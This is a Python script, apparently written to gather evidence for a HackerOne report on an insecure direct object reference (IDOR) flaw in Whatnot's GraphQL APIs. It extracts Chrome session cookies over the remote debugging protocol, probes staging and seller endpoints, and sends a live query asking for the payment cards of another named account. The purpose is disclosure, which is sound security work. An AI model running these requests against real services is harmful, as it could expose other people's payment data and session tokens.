#!/usr/bin/env python3
"""
Whatnot IDOR Evidence Collector
Run this on your Mac: python3 collect_evidence.py

It will open Chrome, ask you to log in as anyakoa, then automatically
collect and save all 5 evidence items.
"""

import subprocess
import sys
import os
import json
import time
import requests
import re
import tempfile
import webbrowser
from datetime import datetime

OUTPUT_FILE = "evidence_results.txt"

ATTACKER_ID  = "58968022"
ATTACKER_USER = "anyakoa"
VICTIM_ID    = "58968144"
VICTIM_USER  = "anyako0810"

WEB_GQL    = "https://www.whatnot.com/services/graphql/"
SELLER_GQL = "https://api.whatnot.com/seller-api/graphql"
STAGE_GQL  = "https://api.stage.whatnot.com/seller-api/graphql"


# ─── colour helpers ──────────────────────────────────────────────────────────
def green(s):  return f"\033[92m{s}\033[0m"
def red(s):    return f"\033[91m{s}\033[0m"
def yellow(s): return f"\033[93m{s}\033[0m"
def bold(s):   return f"\033[1m{s}\033[0m"

def banner(title):
    print("\n" + "=" * 60)
    print(bold(f"  {title}"))
    print("=" * 60)


# ─── chrome CDP cookie extraction ─────────────────────────────────────────────
def extract_cookies_via_chrome():
    """
    Launch Chrome with remote debugging, navigate to whatnot.com,
    wait for user to log in, then pull cookies via CDP.
    """
    import http.client

    port = 9222
    profile_dir = tempfile.mkdtemp(prefix="wn_chrome_")

    chrome_paths = [
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        "/Applications/Chromium.app/Contents/MacOS/Chromium",
        "/usr/bin/google-chrome",
        "/usr/bin/chromium-browser",
    ]

    chrome_bin = None
    for p in chrome_paths:
        if os.path.exists(p):
            chrome_bin = p
            break

    if not chrome_bin:
        return None, "Chrome not found — falling back to manual cookie input"

    cmd = [
        chrome_bin,
        f"--remote-debugging-port={port}",
        f"--user-data-dir={profile_dir}",
        "--no-first-run",
        "--no-default-browser-check",
        "https://www.whatnot.com/login",
    ]

    print(yellow("\n[*] Opening Chrome → log in as anyakoa, then come back here and press Enter"))
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    input("    Press Enter once you are logged in to whatnot.com as anyakoa ... ")

    try:
        conn = http.client.HTTPConnection("localhost", port, timeout=5)
        conn.request("GET", "/json/list")
        resp = conn.getresponse()
        tabs = json.loads(resp.read())

        # find a whatnot tab
        tab = next((t for t in tabs if "whatnot.com" in t.get("url", "")), tabs[0] if tabs else None)
        if not tab:
            proc.terminate()
            return None, "No Chrome tab found"

        ws_url = tab["webSocketDebuggerUrl"]

        import websocket  # pip3 install websocket-client
        ws = websocket.create_connection(ws_url, timeout=10)

        ws.send(json.dumps({
            "id": 1,
            "method": "Network.getAllCookies"
        }))
        raw = json.loads(ws.recv())
        ws.close()
        proc.terminate()

        cookies = raw.get("result", {}).get("cookies", [])
        wn_cookies = {c["name"]: c["value"] for c in cookies if "whatnot" in c.get("domain", "")}

        if not wn_cookies:
            return None, "No whatnot cookies found in Chrome"

        cookie_str = "; ".join(f"{k}={v}" for k, v in wn_cookies.items())
        print(green("[+] Cookies extracted from Chrome automatically"))
        return cookie_str, None

    except Exception as e:
        proc.terminate()
        return None, f"CDP extraction failed: {e}"


def get_cookies_manual():
    print(yellow("""
[!] Automatic extraction unavailable — manual method:

    1. Open Chrome → whatnot.com → logged in as anyakoa
    2. Cmd+Option+I → Network tab → reload
    3. Click any request to www.whatnot.com
    4. Headers → find 'cookie:' → right-click value → Copy value
    5. Paste it below (the full long string)
"""))
    cookie = input("Paste cookie string here: ").strip()
    if cookie.lower().startswith("cookie:"):
        cookie = cookie[7:].strip()
    return cookie


# ─── GraphQL helpers ──────────────────────────────────────────────────────────
BROWSER_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Origin": "https://www.whatnot.com",
    "Referer": "https://www.whatnot.com/",
    "Accept": "application/json",
}

def gql(url, query, cookies=None, bearer=None, timeout=15):
    headers = dict(BROWSER_HEADERS)
    if cookies:
        headers["Cookie"] = cookies
    if bearer:
        headers["Authorization"] = f"Bearer {bearer}"
    try:
        r = requests.post(url, json={"query": query}, headers=headers, timeout=timeout)
        return r.status_code, r.json()
    except requests.exceptions.JSONDecodeError:
        return r.status_code, {"_raw": r.text[:500]}
    except Exception as e:
        return 0, {"_error": str(e)}


# ─── evidence checks ──────────────────────────────────────────────────────────
def check_no_auth_endpoint(label, url, out):
    status, body = gql(url, "{ __typename }")
    line = f"{label}: HTTP {status}"
    if status == 401:
        result = green(f"PASS — HTTP 401 (endpoint live, auth required): {url}")
    elif status == 403:
        result = red(f"BLOCKED — HTTP 403 (Cloudflare/WAF from this IP): {url}")
    elif status == 404:
        result = red(f"FAIL — HTTP 404 (endpoint does not exist): {url}")
    else:
        result = yellow(f"HTTP {status}: {url}  body={str(body)[:100]}")
    print(result)
    out.append(f"{label}: HTTP {status}  url={url}  body={str(body)[:120]}")
    return status == 401


def check_cards_field_on_usernode(cookies, out):
    q = '{ __type(name: "UserNode") { fields { name } } }'
    status, body = gql(WEB_GQL, q, cookies=cookies)
    out.append(f"Evidence C raw: HTTP {status}")
    if status != 200:
        print(red(f"  [C] HTTP {status} — cookies may be expired"))
        out.append(f"Evidence C: FAIL HTTP {status}")
        return False

    fields = [f["name"] for f in
              body.get("data", {}).get("__type", {}).get("fields", [])]
    out.append(f"Evidence C UserNode fields ({len(fields)}): {fields}")

    payment_fields = [f for f in fields if any(
        k in f.lower() for k in ["card", "payment", "billing", "wallet"])]
    has_cards = "cards" in fields

    print(bold("  UserNode payment-related fields:"), payment_fields)
    if has_cards:
        print(green("  [C] PASS — 'cards' field confirmed on UserNode"))
    else:
        print(red("  [C] FAIL — 'cards' field NOT found on UserNode"))
    out.append(f"Evidence C: {'PASS' if has_cards else 'FAIL'}  payment_fields={payment_fields}")
    return has_cards


def check_me_cards(cookies, out):
    q = ('{ me { id username cards(first:5) { edges { node '
         '{ id cardDescription cardType gateway } } } } }')
    status, body = gql(WEB_GQL, q, cookies=cookies)
    out.append(f"Evidence D raw: HTTP {status}")
    out.append(f"Evidence D body: {json.dumps(body)[:600]}")

    if status != 200:
        print(red(f"  [D] HTTP {status}"))
        out.append("Evidence D: FAIL")
        return False

    me = body.get("data", {}).get("me")
    if me is None:
        print(red("  [D] me: null — session invalid or not logged in"))
        out.append("Evidence D: FAIL — me null")
        return False

    edges = me.get("cards", {}).get("edges", [])
    print(f"  Logged in as: {me.get('username')} (id={me.get('id')})")
    print(f"  Cards returned: {len(edges)}")
    for e in edges:
        n = e.get("node", {})
        print(f"    card → type={n.get('cardType')}  desc={n.get('cardDescription')}  gateway={n.get('gateway')}")

    passed = len(edges) >= 0  # even 0 cards is proof the field works
    if me.get("id"):
        print(green(f"  [D] PASS — me.cards field functional for {me.get('username')}"))
        out.append(f"Evidence D: PASS  user={me.get('username')}  id={me.get('id')}  cards={len(edges)}")
    return True


def check_user_id_blocked_web(cookies, out):
    q = f'{{ user(id: "{VICTIM_ID}") {{ id }} }}'
    status, body = gql(WEB_GQL, q, cookies=cookies)
    out.append(f"Evidence E raw: HTTP {status}  body={json.dumps(body)[:300]}")

    errors = body.get("errors", [])
    blocked = any("Cannot query field" in e.get("message", "") and "user" in e.get("message", "")
                  for e in errors)
    if blocked:
        print(green(f"  [E] PASS — user(id:) correctly blocked on web schema"))
        print(f"       Error: {errors[0]['message']}")
        out.append(f"Evidence E: PASS — web schema blocks user(id:)")
    else:
        print(yellow(f"  [E] UNEXPECTED — {body}"))
        out.append(f"Evidence E: UNEXPECTED  body={body}")
    return blocked


def check_seller_api_schema(cookies, out):
    """Try to introspect the Seller API — confirms user(id:) + cards exist there."""
    # Try web JWT as Bearer
    access_jwt = ""
    if cookies:
        m = re.search(r'__Secure-access-token=([^;]+)', cookies)
        if m:
            access_jwt = m.group(1)

    results = []
    for label, extra in [
        ("web_cookie", dict(cookies=cookies)),
        ("jwt_bearer", dict(bearer=access_jwt) if access_jwt else None),
    ]:
        if extra is None:
            continue
        q = '{ __type(name: "Query") { fields { name } } }'
        status, body = gql(SELLER_GQL, q, **extra)
        results.append((label, status, body))
        out.append(f"Seller API introspect [{label}]: HTTP {status}  body={str(body)[:200]}")

    for label, status, body in results:
        if status == 200:
            fields = [f["name"] for f in
                      body.get("data", {}).get("__type", {}).get("fields", [])]
            has_user = "user" in fields
            print(green(f"  [F] Seller API authenticated via {label}! user field={has_user}"))
            print(f"      Query fields: {fields[:20]}")
            out.append(f"Seller API: AUTHENTICATED via {label}  user_field={has_user}  fields={fields}")
            return True, label, fields
        else:
            print(yellow(f"  [F] Seller API [{label}]: HTTP {status}"))

    out.append("Seller API: not authenticated via web credentials (expected — needs wn_access_tk_ Bearer)")
    return False, None, []


def attempt_idor(cookies, out):
    """Attempt the actual IDOR query on the Seller API."""
    q = (f'{{ user(id: "{VICTIM_ID}") '
         f'{{ id username cards(first:10) '
         f'{{ edges {{ node {{ id cardDescription cardType gateway }} }} }} }} }}')

    m = re.search(r'__Secure-access-token=([^;]+)', cookies or "")
    access_jwt = m.group(1) if m else ""

    for label, extra in [
        ("web_cookie",  dict(cookies=cookies)),
        ("jwt_bearer",  dict(bearer=access_jwt) if access_jwt else None),
    ]:
        if extra is None:
            continue
        status, body = gql(SELLER_GQL, q, **extra)
        out.append(f"IDOR attempt [{label}]: HTTP {status}  body={str(body)[:400]}")

        if status == 200:
            user_data = body.get("data", {}).get("user", {})
            if user_data and user_data.get("cards"):
                edges = user_data["cards"].get("edges", [])
                print(red(f"\n  *** IDOR CONFIRMED via {label} ***"))
                print(red(f"  Victim ({VICTIM_USER}) cards visible to attacker ({ATTACKER_USER}):"))
                for e in edges:
                    n = e.get("node", {})
                    print(red(f"    card → {n}"))
                out.append(f"IDOR: CONFIRMED via {label}  victim_cards={edges}")
                return True
            else:
                print(yellow(f"  IDOR [{label}]: HTTP 200 but no card data — {body}"))
        elif status == 401:
            print(yellow(f"  IDOR [{label}]: HTTP 401 — auth rejected (expected for web creds on Seller API)"))
        elif status == 403:
            print(yellow(f"  IDOR [{label}]: HTTP 403 — Cloudflare or auth blocked"))

    print(yellow("  IDOR live test: could not authenticate to Seller API from this IP"))
    print(yellow("  (Seller API requires wn_access_tk_ Bearer token from native iOS app)"))
    out.append("IDOR: NOT PROVEN live — Seller API requires native iOS Bearer token")
    return False


# ─── main ─────────────────────────────────────────────────────────────────────
def main():
    print(bold("\n🔍 Whatnot IDOR Evidence Collector"))
    print(f"   Attacker: {ATTACKER_USER} (ID {ATTACKER_ID})")
    print(f"   Victim:   {VICTIM_USER}  (ID {VICTIM_ID})")
    print(f"   Report:   {OUTPUT_FILE}")

    out_lines = [
        f"Whatnot IDOR Evidence Collection",
        f"Run date: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
        f"Attacker: {ATTACKER_USER} ({ATTACKER_ID})",
        f"Victim:   {VICTIM_USER} ({VICTIM_ID})",
        "",
    ]

    # ── A: staging API public ──────────────────────────────────────────────────
    banner("Evidence A — Staging API publicly accessible")
    a_pass = check_no_auth_endpoint("Staging API", STAGE_GQL, out_lines)

    # ── B: production Seller API exists ───────────────────────────────────────
    banner("Evidence B — Production Seller API exists")
    b_pass = check_no_auth_endpoint("Prod Seller API", SELLER_GQL, out_lines)

    # ── get cookies ───────────────────────────────────────────────────────────
    banner("Getting session cookies (anyakoa account)")
    cookies = None

    # check if cookies_a.txt exists locally
    if os.path.exists("cookies_a.txt"):
        with open("cookies_a.txt") as f:
            stored = f.read().strip()
        if "__Secure-access-token" in stored or "__Secure-refresh-token" in stored:
            print(yellow("[*] Found cookies_a.txt — trying stored cookies first"))
            # Quick auth check
            status, body = gql(WEB_GQL, "{ me { id username } }", cookies=stored)
            me = body.get("data", {}).get("me") if status == 200 else None
            if me:
                print(green(f"[+] Stored cookies valid — logged in as {me.get('username')}"))
                cookies = stored
            else:
                print(yellow("[!] Stored cookies expired"))

    if not cookies:
        cookies, err = extract_cookies_via_chrome()
        if not cookies:
            print(yellow(f"[!] Auto-extract failed: {err}"))
            cookies = get_cookies_manual()

    if not cookies:
        print(red("[!] No cookies available — skipping auth-required evidence (C, D, E)"))
    else:
        # save fresh cookies
        with open("cookies_a.txt", "w") as f:
            f.write(cookies)

    # ── C: cards field on UserNode ────────────────────────────────────────────
    banner("Evidence C — 'cards' field exists on UserNode (schema)")
    if cookies:
        c_pass = check_cards_field_on_usernode(cookies, out_lines)
    else:
        print(yellow("  Skipped — no cookies"))
        c_pass = False

    # ── D: me.cards returns own data ──────────────────────────────────────────
    banner("Evidence D — me.cards returns authenticated user's payment data")
    if cookies:
        d_pass = check_me_cards(cookies, out_lines)
    else:
        print(yellow("  Skipped — no cookies"))
        d_pass = False

    # ── E: user(id:) blocked on web ───────────────────────────────────────────
    banner("Evidence E — user(id:) lookup blocked on web GraphQL schema")
    if cookies:
        e_pass = check_user_id_blocked_web(cookies, out_lines)
    else:
        print(yellow("  Skipped — no cookies"))
        e_pass = False

    # ── F: Seller API introspection ───────────────────────────────────────────
    banner("Evidence F — Seller API schema (user + cards fields)")
    if cookies:
        seller_authed, seller_method, seller_fields = check_seller_api_schema(cookies, out_lines)
    else:
        seller_authed = False

    # ── G: live IDOR attempt ──────────────────────────────────────────────────
    banner("Evidence G — Live IDOR attempt (Account A reads Account B cards)")
    if cookies:
        idor_confirmed = attempt_idor(cookies, out_lines)
    else:
        print(yellow("  Skipped — no cookies"))
        idor_confirmed = False

    # ── summary ───────────────────────────────────────────────────────────────
    banner("RESULTS SUMMARY")
    results = [
        ("A", "Staging API publicly reachable",          a_pass),
        ("B", "Prod Seller API exists (HTTP 401)",        b_pass),
        ("C", "cards field on UserNode",                  c_pass),
        ("D", "me.cards returns own card data",           d_pass),
        ("E", "user(id:) blocked on web schema",          e_pass),
        ("F", "Seller API authenticated",                 seller_authed),
        ("G", "IDOR live proof (A reads B's cards)",      idor_confirmed),
    ]

    out_lines.append("\n--- SUMMARY ---")
    for code, desc, passed in results:
        status_str = green("PASS") if passed else (red("FAIL") if code in ("A","B","C","D") else yellow("NOT PROVEN"))
        symbol = "✓" if passed else ("✗" if code in ("A","B","C","D") else "~")
        print(f"  [{symbol}] {code}: {desc:45s}  {status_str}")
        out_lines.append(f"[{'PASS' if passed else 'FAIL'}] {code}: {desc}")

    if not idor_confirmed:
        print(yellow("""
  NOTE: Live IDOR proof requires wn_access_tk_ Bearer token issued by
  the native iOS app. SSL certificate pinning on api.whatnot.com prevents
  token capture via proxy. Whatnot's security team can verify internally:

    POST https://api.whatnot.com/seller-api/graphql
    Authorization: Bearer <any valid wn_access_tk_ token>

    { user(id: "<other user ID>") { cards { edges { node {
        id cardDescription cardType gateway } } } } }
"""))

    # ── write report ──────────────────────────────────────────────────────────
    with open(OUTPUT_FILE, "w") as f:
        f.write("\n".join(out_lines))
    print(green(f"\n[+] Full evidence log saved to {OUTPUT_FILE}"))
    print(bold(f"    Attach {OUTPUT_FILE} + terminal screenshots to your HackerOne report.\n"))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAborted.")
